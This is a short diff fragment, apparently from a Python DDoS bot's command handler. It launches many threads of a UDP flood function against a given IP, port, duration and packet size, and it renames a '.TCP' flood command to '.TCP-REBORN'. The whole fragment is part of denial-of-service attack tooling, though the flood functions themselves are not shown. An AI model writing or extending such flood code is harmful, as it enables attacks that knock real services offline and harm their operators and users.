@@ -118,7 +118,7 @@ def main():
                 for _ in range(threads):
                     threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
 
-            elif command == '.TCP':
+            elif command == '.TCP-REBORN':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
